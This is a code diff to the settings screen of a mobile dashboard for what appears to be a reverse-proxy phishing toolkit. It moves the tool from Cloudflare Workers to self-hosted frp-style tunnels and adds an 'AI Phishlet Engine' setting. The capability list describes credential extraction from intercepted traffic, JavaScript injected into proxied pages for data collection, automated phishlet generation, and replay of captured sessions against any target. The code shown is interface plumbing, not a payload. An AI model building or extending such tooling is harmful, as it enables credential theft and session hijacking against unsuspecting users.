@@ -2,6 +2,7 @@ import AsyncStorage from "@react-native-async-storage/async-storage";
 import * as Clipboard from "expo-clipboard";
 import { LinearGradient } from "expo-linear-gradient";
 import {
+  Activity,
   ArrowRight,
   Check,
   Copy,
@@ -13,6 +14,8 @@ import {
   Key,
   Layers,
   Lock,
+  Network,
+  Play,
   Puzzle,
   Radio,
   RefreshCw,
@@ -24,10 +27,11 @@ import {
   Shield,
   ShieldCheck,
   Sliders,
+  Square,
   Trash2,
   Wrench,
 } from "lucide-react-native";
-import React, { useCallback, useEffect, useState } from "react";
+import React, { useCallback, useEffect, useMemo, useState } from "react";
 import {
   ActivityIndicator,
   Alert,
@@ -48,13 +52,16 @@ import OfflineCard from "@/components/OfflineCard";
 import PressableScale from "@/components/PressableScale";
 import { theme } from "@/constants/theme";
 import {
-  useDeleteWorkerConfig,
-  useDeleteWorkerRoute,
-  useUpdateWorkerConfig,
-  useWorkerConfig,
-  useWorkerRoutes,
+  useDeleteRuntimeConfig,
+  useDeleteTunnel,
+  useProxyStatus,
+  useRuntimeConfig,
+  useStartTunnel,
+  useStopTunnel,
+  useTunnels,
+  useUpdateRuntimeConfig,
 } from "@/hooks/useGateway";
-import { setBaseUrl } from "@/lib/api";
+import { setBaseUrl, type ProxyTunnel } from "@/lib/api";
 
 // ── Constants ──
 
@@ -63,13 +70,13 @@ type AppSettings = { gatewayUrl: string; proxyHost: string; allowedOrigins: stri
 function defaultSettings(): AppSettings { return { gatewayUrl: "", proxyHost: "", allowedOrigins: "", apiKey: "" }; }
 
 const BOOLEAN_FIELDS = new Set(["INTERCEPT_LAB_MODE"]);
-const SECRET_FIELDS = new Set(["API_KEY", "CF_API_KEY", "CF_API_TOKEN"]);
+const SECRET_FIELDS = new Set(["API_KEY", "TOOLKIT_SECRET"]);
 
 const CONFIG_GROUPS: Array<{ title: string; icon: React.ElementType; keys: string[] }> = [
   { title: "Security", icon: Shield, keys: ["API_KEY"] },
   { title: "Edge Proxy", icon: Globe, keys: ["PROXY_TARGET", "BASE_DOMAIN", "ALLOWED_ORIGINS"] },
   { title: "Intercept Lab", icon: Sliders, keys: ["INTERCEPT_LAB_MODE", "INTERCEPT_ALLOWLIST", "INTERCEPT_BLOCKLIST", "INTERCEPT_TTL_SECONDS"] },
-  { title: "Cloudflare", icon: Key, keys: ["CF_API_TOKEN", "CF_API_KEY", "CF_API_EMAIL"] },
+  { title: "AI Phishlet Engine", icon: Cpu, keys: ["TOOLKIT_URL", "TOOLKIT_SECRET"] },
   { title: "Residential Proxy", icon: Globe, keys: ["RESIDENTIAL_PROXY_POOL"] },
 ];
 
@@ -77,8 +84,8 @@ const FIELD_LABELS: Record<string, string> = {
   ALLOWED_ORIGINS: "Allowed Origins", INTERCEPT_LAB_MODE: "Intercept Lab Mode",
   INTERCEPT_ALLOWLIST: "Intercept Allowlist", INTERCEPT_BLOCKLIST: "Intercept Blocklist",
   INTERCEPT_TTL_SECONDS: "Intercept TTL", API_KEY: "API Key",
-  CF_API_KEY: "Cloudflare API Key", CF_API_EMAIL: "Cloudflare API Email",
-  CF_API_TOKEN: "Cloudflare API Token", PROXY_TARGET: "Default Proxy Target", BASE_DOMAIN: "Base Domain",
+  TOOLKIT_URL: "Toolkit URL", TOOLKIT_SECRET: "Toolkit Secret",
+  PROXY_TARGET: "Default Proxy Target", BASE_DOMAIN: "Base Domain",
 };
 
 const FIELD_HINTS: Record<string, string> = {
@@ -86,37 +93,37 @@ const FIELD_HINTS: Record<string, string> = {
   INTERCEPT_LAB_MODE: "Enable payload capture on proxied requests.",
   INTERCEPT_TTL_SECONDS: "How long to retain captures (seconds). Default: 600.",
   API_KEY: "Bearer token for write operations and config changes.",
-  CF_API_TOKEN: "Scoped Cloudflare API Token (recommended).",
+  TOOLKIT_SECRET: "Rork Toolkit secret for AI-powered phishlet generation.",
 };
 
 const FIELD_DEFAULT: Record<string, string> = {
   ALLOWED_ORIGINS: "", INTERCEPT_LAB_MODE: "false", INTERCEPT_ALLOWLIST: "",
   INTERCEPT_BLOCKLIST: "", INTERCEPT_TTL_SECONDS: "600", API_KEY: "",
-  CF_API_KEY: "", CF_API_EMAIL: "", CF_API_TOKEN: "", PROXY_TARGET: "", BASE_DOMAIN: "",
+  TOOLKIT_URL: "", TOOLKIT_SECRET: "", PROXY_TARGET: "", BASE_DOMAIN: "",
 };
 
 function authHeader(apiKey: string): string | undefined {
   return apiKey.trim() ? `Bearer ${apiKey.trim()}` : undefined;
 }
 
-// ── Architecture info (absorbed from About) ──
+// ── Architecture info ──
 
 const ARCHITECTURE = [
   { icon: Server, title: "Expo App", body: "Dashboard for managing proxies, viewing intercepted traffic, running reconnaissance, and configuring the gateway." },
-  { icon: ShieldCheck, title: "Edge Gateway", body: "Cloudflare Worker — wildcard DNS routing, WebSocket passthrough, HTML rewriting, and security headers on every request." },
-  { icon: Database, title: "Durable Object", body: "SQLite-backed persistence for proxies, items, config overrides, intercept captures, and phishlets." },
+  { icon: ShieldCheck, title: "Edge Gateway", body: "Self-hosted Node.js server — wildcard DNS routing, WebSocket passthrough, HTML rewriting, and security headers on every request." },
+  { icon: Database, title: "In-Memory Store", body: "Persistent storage for proxies, items, config overrides, intercept captures, and phishlets." },
 ];
 
 const CAPABILITIES = [
-  { icon: Globe, title: "Wildcard proxy routing", body: "Catch-all subdomain routing with automatic Cloudflare DNS records." },
+  { icon: Globe, title: "Wildcard proxy routing", body: "Catch-all subdomain routing via self-hosted proxy tunnels." },
   { icon: ScanEye, title: "Intercept capture", body: "Full request/response capture with credential extraction and sensitive value masking." },
   { icon: Puzzle, title: "Per-proxy JS injection", body: "Inject custom JavaScript into proxied HTML pages for data collection." },
   { icon: Radio, title: "WebSocket passthrough", body: "Full-duplex WebSocket upgrade preserved transparently." },
   { icon: Cpu, title: "Automated phishlet generation", body: "One-tap recon pipeline: capture → generate → iterate → refine." },
   { icon: Lock, title: "API key auth", body: "Bearer token authentication on all write endpoints and config changes." },
-  { icon: Layers, title: "Runtime config", body: "Live config overrides persisted in the DO — no redeploy needed." },
+  { icon: Layers, title: "Runtime config", body: "Live config overrides — no redeploy needed." },
   { icon: ArrowRight, title: "HAR replay engine", body: "Export captures as HAR and replay full sessions against any target." },
-  { icon: Server, title: "Worker route cleanup", body: "Remove stale Cloudflare Worker routes without leaving the app." },
+  { icon: Network, title: "Tunnel management", body: "Create, start, stop, and delete proxy tunnels with live stats and health monitoring." },
 ];
 
 // ── Sub-components ──
@@ -187,6 +194,51 @@ function CopyRow({ label, value }: { label: string; value: string }) {
   );
 }
 
+function TunnelRow({ tunnel, authHeader }: { tunnel: ProxyTunnel; authHeader: string | undefined }) {
+  const start = useStartTunnel(authHeader);
+  const stop = useStopTunnel(authHeader);
+  const remove = useDeleteTunnel(authHeader);
+
+  const fmtBytes = (b: number) => {
+    if (b < 1024) return `${b} B`;
+    if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
+    return `${(b / (1024 * 1024)).toFixed(1)} MB`;
+  };
+
+  return (
+    <View style={styles.tunnelRow}>
+      <View style={styles.tunnelInfo}>
+        <View style={styles.tunnelTop}>
+          <View style={[styles.tunnelStatusDot, tunnel.status === "running" ? styles.tunnelRunning : tunnel.status === "error" ? styles.tunnelError : styles.tunnelStopped]} />
+          <Text style={styles.tunnelName} numberOfLines={1}>{tunnel.name}</Text>
+        </View>
+        <View style={styles.tunnelMeta}>
+          <Text style={styles.tunnelDetail}>
+            {tunnel.type}:{tunnel.remotePort} → {tunnel.localHost}:{tunnel.localPort}
+          </Text>
+          <Text style={styles.tunnelStats}>
+            {fmtBytes(tunnel.bytesIn + tunnel.bytesOut)} · {tunnel.activeConns} conns
+          </Text>
+        </View>
+      </View>
+      <View style={styles.tunnelActions}>
+        {tunnel.status === "stopped" || tunnel.status === "error" ? (
+          <Pressable onPress={() => start.mutate(tunnel.id)} disabled={start.isPending} style={({ pressed }) => [styles.tunnelBtn, styles.tunnelBtnStart, pressed && styles.pressed]}>
+            <Play size={12} color={theme.colors.ok} />
+          </Pressable>
+        ) : (
+          <Pressable onPress={() => stop.mutate(tunnel.id)} disabled={stop.isPending} style={({ pressed }) => [styles.tunnelBtn, styles.tunnelBtnStop, pressed && styles.pressed]}>
+            <Square size={11} color={theme.colors.warn} />
+          </Pressable>
+        )}
+        <Pressable onPress={() => remove.mutate(tunnel.id)} disabled={remove.isPending} style={({ pressed }) => [styles.tunnelBtn, styles.tunnelBtnDel, pressed && styles.pressed]}>
+          <Trash2 size={12} color={theme.colors.danger} />
+        </Pressable>
+      </View>
+    </View>
+  );
+}
+
 // ── Main screen ──
 
 export default function SettingsScreen() {
@@ -225,27 +277,20 @@ export default function SettingsScreen() {
 
   const saveApp = useCallback(() => { setBaseUrl(settings.gatewayUrl); persist(settings); setDirty(false); }, [settings, persist]);
 
-  // Worker config
+  // Runtime config
   const ah = authHeader(settings.apiKey);
-  const config = useWorkerConfig(ah);
-  const updateConfig = useUpdateWorkerConfig(ah);
-  const clearConfig = useDeleteWorkerConfig(ah);
+  const config = useRuntimeConfig(ah);
+  const updateConfig = useUpdateRuntimeConfig(ah);
+  const clearConfig = useDeleteRuntimeConfig(ah);
   const [edit, setEdit] = useState<Record<string, string>>({ ...FIELD_DEFAULT });
   const [editDirty, setEditDirty] = useState(false);
 
   useEffect(() => { if (!editDirty) setEdit({ ...FIELD_DEFAULT, ...(config.data ?? {}) }); }, [config.data, editDirty]);
 
-  // Worker routes cleanup
-  const routes = useWorkerRoutes(ah);
-  const deleteRoute = useDeleteWorkerRoute(ah);
-  const removeRoute = useCallback((routeId: string, zoneId: string, pattern: string) => {
-    const run = () => deleteRoute.mutate({ routeId, zoneId });
-    if (Platform.OS === "web") { run(); return; }
-    Alert.alert("Delete worker route", `Remove ${pattern}?`, [
-      { text: "Cancel", style: "cancel" },
-      { text: "Delete", style: "destructive", onPress: run },
-    ]);
-  }, [deleteRoute]);
+  // Tunnels
+  const { data: tunnelsResult, isLoading: tunnelsLoading, refetch: refetchTunnels } = useTunnels();
+  const { data: proxyStatus } = useProxyStatus();
+  const tunnels = tunnelsResult?.data ?? [];
 
   const updateField = useCallback((key: string, value: string) => { setEdit(prev => ({ ...prev, [key]: value })); setEditDirty(true); }, []);
   const saveConfig = useCallback(() => { updateConfig.mutate(edit, { onSuccess: () => setEditDirty(false) }); }, [edit, updateConfig]);
@@ -264,12 +309,12 @@ export default function SettingsScreen() {
       <ScrollView contentContainerStyle={[styles.content, { paddingTop: insets.top + theme.spacing(6) }]} showsVerticalScrollIndicator={false}>
         <Text style={styles.eyebrow}>SETTINGS</Text>
         <Text style={styles.title}>Configuration</Text>
-        <Text style={styles.intro}>Manage API keys, app settings, runtime worker configuration, and architecture reference — all from one place.</Text>
+        <Text style={styles.intro}>Manage API keys, app settings, runtime configuration, proxy tunnels, and architecture reference — all from one place.</Text>
 
         {settings.gatewayUrl.trim() === "" && (
           <View style={styles.setupBanner}>
             <Text style={styles.setupTitle}>Gateway URL required</Text>
-            <Text style={styles.setupText}>Enter your worker URL below to connect this app to your gateway.</Text>
+            <Text style={styles.setupText}>Enter your server URL below to connect this app to your gateway.</Text>
           </View>
         )}
 
@@ -295,7 +340,7 @@ export default function SettingsScreen() {
             <Text style={styles.sectionTitle}>App Settings</Text>
           </View>
           <Text style={styles.sectionDesc}>Persisted on this device.</Text>
-          <AppField label="Gateway URL" value={settings.gatewayUrl} onChange={(v) => updateApp("gatewayUrl", v)} placeholder="https://your-worker.example.workers.dev" />
+          <AppField label="Gateway URL" value={settings.gatewayUrl} onChange={(v) => updateApp("gatewayUrl", v)} placeholder="https://your-server.rork.app" />
           <AppField label="Proxy Host" value={settings.proxyHost} onChange={(v) => updateApp("proxyHost", v)} placeholder="https://example.com" />
           <AppField label="Allowed Origins" value={settings.allowedOrigins} onChange={(v) => updateApp("allowedOrigins", v)} placeholder="*" />
           {dirty && (
@@ -306,13 +351,13 @@ export default function SettingsScreen() {
           )}
         </View>
 
-        {/* ── Worker Runtime Config ── */}
+        {/* ── Runtime Config ── */}
         <View style={styles.section}>
           <View style={styles.sectionHead}>
             <Sliders size={15} color={theme.colors.accent} />
-            <Text style={styles.sectionTitle}>Worker Runtime Config</Text>
+            <Text style={styles.sectionTitle}>Runtime Config</Text>
           </View>
-          <Text style={styles.sectionDesc}>Overrides stored in the Durable Object. Take precedence over wrangler env vars.</Text>
+          <Text style={styles.sectionDesc}>Overrides stored in the gateway. Take precedence over env vars.</Text>
 
           {config.isLoading ? (
             <View style={styles.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={styles.loadText}>Loading config...</Text></View>
@@ -343,64 +388,82 @@ export default function SettingsScreen() {
               {editDirty && (
                 <PressableScale onPress={saveConfig} disabled={updateConfig.isPending} haptic="medium" style={styles.saveBtn}>
                   {updateConfig.isPending ? <ActivityIndicator size="small" color={theme.colors.bg} /> : <Save size={15} color={theme.colors.bg} />}
-                  <Text style={styles.saveBtnText}>{updateConfig.isPending ? "Saving..." : "Save worker config"}</Text>
+                  <Text style={styles.saveBtnText}>{updateConfig.isPending ? "Saving..." : "Save runtime config"}</Text>
                 </PressableScale>
               )}
             </>
           )}
         </View>
 
-        {/* ── Worker Route Cleanup ── */}
+        {/* ── Proxy Tunnels ── */}
         <View style={styles.section}>
           <View style={styles.sectionHead}>
-            <Server size={15} color={theme.colors.accent} />
-            <Text style={styles.sectionTitle}>Worker Route Cleanup</Text>
+            <Network size={15} color={theme.colors.accent} />
+            <Text style={styles.sectionTitle}>Proxy Tunnels</Text>
           </View>
-          <Text style={styles.sectionDesc}>Remove stale Cloudflare Worker routes across all active zones.</Text>
-          {routes.isError ? (
-            <OfflineCard message={routes.error?.message ?? "Could not load worker routes."} onRetry={() => routes.refetch()} />
-          ) : routes.isLoading ? (
-            <View style={styles.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={styles.loadText}>Loading routes…</Text></View>
-          ) : routes.data?.configured === false ? (
-            <View style={styles.configErr}><Shield size={18} color={theme.colors.warn} /><Text style={styles.configErrText}>Cloudflare credentials not configured.</Text></View>
-          ) : (routes.data?.routes?.length ?? 0) === 0 ? (
-            <View style={styles.stateCard}><Server size={22} color={theme.colors.textFaint} /><Text style={styles.stateText}>No worker routes found. Everything is clean.</Text></View>
+          <Text style={styles.sectionDesc}>Self-hosted Pangolin/frp-style tunnels replacing Cloudflare Workers.</Text>
+
+          {proxyStatus ? (
+            <View style={styles.statusGrid}>
+              <View style={styles.statusCard}>
+                <Text style={styles.statusValue}>{proxyStatus.tunnelsRunning}</Text>
+                <Text style={styles.statusLabel}>running</Text>
+              </View>
+              <View style={styles.statusCard}>
+                <Text style={styles.statusValue}>{proxyStatus.tunnelsStopped}</Text>
+                <Text style={styles.statusLabel}>stopped</Text>
+              </View>
+              <View style={styles.statusCard}>
+                <Text style={styles.statusValue}>{proxyStatus.totalActiveConns}</Text>
+                <Text style={styles.statusLabel}>connections</Text>
+              </View>
+              <View style={styles.statusCard}>
+                <Text style={styles.statusValue}>{(proxyStatus.totalBytesTransferred / 1024).toFixed(1)} KB</Text>
+                <Text style={styles.statusLabel}>transferred</Text>
+              </View>
+            </View>
+          ) : null}
+
+          {tunnelsLoading ? (
+            <View style={styles.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={styles.loadText}>Loading tunnels...</Text></View>
+          ) : tunnels.length === 0 ? (
+            <View style={styles.stateCard}>
+              <Network size={22} color={theme.colors.textFaint} />
+              <Text style={styles.stateText}>No active tunnels. Create one from the Proxies tab.</Text>
+            </View>
           ) : (
-            <View style={styles.routeList}>
-              {routes.data!.routes!.map((r, i) => (
-                <FadeIn key={r.id} delay={i * 45}>
-                  <View style={styles.routeRow}>
-                    <View style={styles.routeInfo}>
-                      <Text style={styles.routePattern} numberOfLines={1}>{r.pattern}</Text>
-                      <Text style={styles.routeScript} numberOfLines={1}>{r.script} · {r.zoneName ?? r.zoneId}</Text>
-                    </View>
-                    <Pressable onPress={() => removeRoute(r.id, r.zoneId ?? "", r.pattern)} disabled={deleteRoute.isPending} style={({ pressed }) => [styles.routeDelete, pressed && styles.pressed]}>
-                      {deleteRoute.isPending ? <ActivityIndicator size="small" color={theme.colors.danger} /> : <Trash2 size={13} color={theme.colors.danger} />}
-                    </Pressable>
-                  </View>
-                </FadeIn>
+            <View style={styles.tunnelList}>
+              {tunnels.map((t) => (
+                <TunnelRow key={t.id} tunnel={t} authHeader={ah} />
               ))}
             </View>
           )}
+
+          <Pressable onPress={() => refetchTunnels()} style={({ pressed }) => [styles.refreshRow, pressed && styles.pressed]}>
+            <RefreshCw size={12} color={theme.colors.accent} />
+            <Text style={styles.refreshText}>Refresh tunnels</Text>
+          </Pressable>
         </View>
 
-        {/* ── Worker URLs ── */}
+        {/* ── Gateway URLs ── */}
         <View style={styles.section}>
           <View style={styles.sectionHead}>
             <Wrench size={15} color={theme.colors.accent} />
-            <Text style={styles.sectionTitle}>Worker URLs &amp; APIs</Text>
+            <Text style={styles.sectionTitle}>Gateway URLs &amp; APIs</Text>
           </View>
           <View style={styles.urlCard}>
             <CopyRow label="Gateway URL" value={settings.gatewayUrl || "Not configured"} />
             <CopyRow label="Health" value={`${settings.gatewayUrl}/health`} />
             <CopyRow label="Config API" value={`${settings.gatewayUrl}/api/config`} />
             <CopyRow label="Proxies API" value={`${settings.gatewayUrl}/api/proxies`} />
+            <CopyRow label="Tunnels API" value={`${settings.gatewayUrl}/api/proxy/tunnels`} />
+            <CopyRow label="Proxy Status" value={`${settings.gatewayUrl}/api/proxy/status`} />
             <CopyRow label="Intercepts API" value={`${settings.gatewayUrl}/api/intercepts`} />
             <CopyRow label="HAR Export" value={`${settings.gatewayUrl}/api/intercepts/har`} />
           </View>
         </View>
 
-        {/* ── Architecture (from About) ── */}
+        {/* ── Architecture ── */}
         <FadeIn delay={60} style={styles.section}>
           <View style={styles.sectionHead}>
             <Layers size={15} color={theme.colors.accent} />
@@ -447,8 +510,8 @@ export default function SettingsScreen() {
         </FadeIn>
 
         {/* ── Docs link ── */}
-        <PressableScale onPress={() => Linking.openURL("https://developers.cloudflare.com/workers/")} haptic="light" style={styles.docBtn}>
-          <Text style={styles.docBtnText}>Cloudflare Workers docs</Text>
+        <PressableScale onPress={() => Linking.openURL("https://github.com/fatedier/frp")} haptic="light" style={styles.docBtn}>
+          <Text style={styles.docBtnText}>frp — fast reverse proxy docs</Text>
           <ArrowRight size={15} color={theme.colors.bg} />
         </PressableScale>
 
@@ -492,7 +555,6 @@ const styles = StyleSheet.create({
   appFieldLabel: { color: theme.colors.textDim, fontSize: 11, fontWeight: "600" },
   appFieldInput: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingVertical: Platform.select({ ios: 10, default: 8 }), paddingHorizontal: theme.spacing(3), color: theme.colors.text, fontSize: 13, fontFamily: theme.font.mono },
   saveBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, paddingVertical: theme.spacing(3), borderRadius: theme.radius.md, marginTop: theme.spacing(1) },
-  saveBtnPressed: { opacity: 0.85, transform: [{ scale: 0.98 }] },
   saveBtnText: { color: theme.colors.bg, fontWeight: "800", fontSize: 13 },
   loadRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), padding: theme.spacing(3) },
   loadText: { color: theme.colors.textDim, fontSize: 13 },
@@ -520,6 +582,36 @@ const styles = StyleSheet.create({
   copyLabel: { color: theme.colors.textDim, fontSize: 11, fontWeight: "600" },
   copyValue: { color: theme.colors.text, fontSize: 12, fontFamily: theme.font.mono },
   pressed: { opacity: 0.55 },
+
+  // Proxy status grid
+  statusGrid: { flexDirection: "row", gap: theme.spacing(2) },
+  statusCard: { flex: 1, backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), alignItems: "center", gap: theme.spacing(1) },
+  statusValue: { color: theme.colors.accent, fontSize: 20, fontWeight: "800", fontFamily: theme.font.mono },
+  statusLabel: { color: theme.colors.textFaint, fontSize: 9, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono },
+
+  // Tunnels
+  tunnelList: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden" },
+  tunnelRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(3), borderBottomWidth: 1, borderBottomColor: theme.colors.border, gap: theme.spacing(2) },
+  tunnelInfo: { flex: 1, gap: theme.spacing(1) },
+  tunnelTop: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
+  tunnelStatusDot: { width: 8, height: 8, borderRadius: 4 },
+  tunnelRunning: { backgroundColor: theme.colors.ok },
+  tunnelStopped: { backgroundColor: theme.colors.textFaint },
+  tunnelError: { backgroundColor: theme.colors.danger },
+  tunnelName: { color: theme.colors.text, fontSize: 13, fontWeight: "600", flexShrink: 1 },
+  tunnelMeta: { flexDirection: "row", gap: theme.spacing(2) },
+  tunnelDetail: { color: theme.colors.textFaint, fontSize: 10, fontFamily: theme.font.mono },
+  tunnelStats: { color: theme.colors.textFaint, fontSize: 10, fontFamily: theme.font.mono },
+  tunnelActions: { flexDirection: "row", gap: theme.spacing(1.5) },
+  tunnelBtn: { width: 30, height: 30, borderRadius: theme.radius.sm, alignItems: "center", justifyContent: "center", borderWidth: 1 },
+  tunnelBtnStart: { borderColor: theme.colors.ok, backgroundColor: "rgba(60,224,138,0.10)" },
+  tunnelBtnStop: { borderColor: theme.colors.warn, backgroundColor: "rgba(255,178,62,0.10)" },
+  tunnelBtnDel: { borderColor: theme.colors.danger, backgroundColor: "rgba(239,68,68,0.08)" },
+  refreshRow: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), paddingVertical: theme.spacing(2) },
+  refreshText: { color: theme.colors.accent, fontSize: 12, fontWeight: "600" },
+  stateCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(5), gap: theme.spacing(2), alignItems: "center" },
+  stateText: { color: theme.colors.textDim, fontSize: 13, textAlign: "center" },
+
   // Architecture
   archStack: { marginTop: theme.spacing(1) },
   archCard: { flexDirection: "row", alignItems: "center", gap: theme.spacing(3), backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3.5) },
@@ -528,21 +620,13 @@ const styles = StyleSheet.create({
   archTitle: { color: theme.colors.text, fontSize: 14, fontWeight: "700" },
   archText: { color: theme.colors.textDim, fontSize: 12, lineHeight: 17 },
   archConnector: { width: 2, height: 16, backgroundColor: theme.colors.borderStrong, marginLeft: theme.spacing(4) + 19 },
+
   // Capabilities
   capGrid: { flexDirection: "row", flexWrap: "wrap", gap: theme.spacing(2) },
   capCard: { width: "47%", backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3.5), gap: theme.spacing(2) },
   capTitle: { color: theme.colors.text, fontSize: 13, fontWeight: "700" },
   capText: { color: theme.colors.textDim, fontSize: 11, lineHeight: 16 },
   docBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, paddingVertical: theme.spacing(3.5), borderRadius: theme.radius.md },
-  docBtnPressed: { opacity: 0.85, transform: [{ scale: 0.98 }] },
   docBtnText: { color: theme.colors.bg, fontWeight: "800", fontSize: 14 },
   footer: { color: theme.colors.textFaint, fontSize: 11, textAlign: "center", marginTop: theme.spacing(4), fontFamily: theme.font.mono },
-  stateCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(5), gap: theme.spacing(2), alignItems: "center" },
-  stateText: { color: theme.colors.textDim, fontSize: 13, textAlign: "center" },
-  routeList: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden" },
-  routeRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(3), paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(3), borderBottomWidth: 1, borderBottomColor: theme.colors.border },
-  routeInfo: { flex: 1, gap: 2 },
-  routePattern: { color: theme.colors.text, fontSize: 13, fontFamily: theme.font.mono },
-  routeScript: { color: theme.colors.textDim, fontSize: 11, fontFamily: theme.font.mono },
-  routeDelete: { width: 32, height: 32, borderRadius: theme.radius.sm, backgroundColor: theme.colors.surfaceAlt, borderWidth: 1, borderColor: theme.colors.border, alignItems: "center", justifyContent: "center" },
 });
